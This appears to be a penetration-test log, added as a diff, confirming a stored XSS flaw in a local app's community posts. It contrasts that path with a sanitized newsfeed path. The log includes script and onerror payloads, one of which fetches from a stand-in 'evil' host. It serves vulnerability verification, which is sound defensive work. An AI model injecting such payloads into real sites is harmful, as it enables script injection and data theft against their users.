@@ -1,0 +1,18 @@
+========================================================================
+VULN-031: Community title/body stored unsanitized (latent stored XSS)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] community.ts:102-145 inserts title/body verbatim; newsfeed.ts:108 calls sanitizeHtml
+[SETUP] admin login + provision a STUDENT (self-registered org member)
+[SETUP] student profile=76b1e0ac-60a3-4e7c-9846-ad1aeaf98d40 course=41b41d7f-9a7f-43b0-8ff6-8185d90d5b04
+[STEP] POST /community with <script>/onerror payload in title+body (slug=xss-post_4474a9c4)
+[INFO]   response: HTTP 201 {"success":true,"data":{"id":9,"title":"<img src=x onerror=alert(\"xss_61937199\")>","body":"<script>alert(\"xss_61937199\")</script><img src=x onerro
+[PROOF] DB community_question.body = '<script>alert("xss_61937199")</script><img src=x onerror="fetch(\'//evil/xss_61937199\')"><b>xss_61937199</b>'
+[PROOF] DB community_question.title = '<img src=x onerror=alert("xss_61937199")>'
+[STEP] contrast: admin posts the SAME payload to a course newsfeed (which calls sanitizeHtml)
+[INFO]   newsfeed create: HTTP 201 {"success":true,"data":{"createdAt":"2026-09-27 14:50:05.64372+00","authorId":"a144fec5-9983-4e98-a13d-e56636466ee8","content":"<img src=\"x\"><b>xss_
+[PROOF] DB course_newsfeed.content = '<img src="x"><b>xss_61937199</b>'
+[INFO] cleanup: archived 1 test-student seat(s) created this run
+[PROOF] community stored <script>+onerror VERBATIM, while the newsfeed path stripped the identical payload — server-side sanitization is missing ONLY on the community write
+==> VULN-031: CONFIRMED — community title/body stored unsanitized (raw <script>/onerror); newsfeed sanitizes same input. Script-exec mitigated today by CSP+DOMPurify render → stored HTML-injection / latent XSS
+[OK] confirmed — stored unsanitized HTML on the community write path (latent stored XSS)
